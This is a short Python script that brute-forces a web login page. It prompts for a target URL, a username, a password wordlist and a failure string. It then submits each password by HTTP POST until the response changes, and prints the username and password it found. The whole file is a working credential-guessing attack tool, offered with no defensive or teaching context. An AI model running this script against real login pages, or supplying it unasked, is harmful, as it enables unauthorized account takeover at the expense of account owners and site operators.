import requests
from termcolor import colored

#prompt user to input four values
url = input("[+] Enter Page URL: ")
username = input("[=] Enter Username For Account to Bruteforce: ")
password_file = input("[+] Enter the Password File To Use: ")
login_failed = input("[+] Enter String to Output When Login Fails: ")

def cracking(username,url):
    for password in passwords:
        password = password.strip()
        print(colored(("Trying...: " + password), 'red'))
        data = {'username':username,'password':password,'Login':'submit'}
        response = requests.post(url, data=data)
        if login_failed in response.content.decode():
            pass
        else:
            print(colored(('[+] Found Username: ==> ' + username), 'green'))
            print(colored(('[+] Found Password: ==> ' + password), 'green'))
            exit()
            
with open(password_file, 'r') as passwords:
    cracking(username,url)
    
print("[!!] Password Not In File")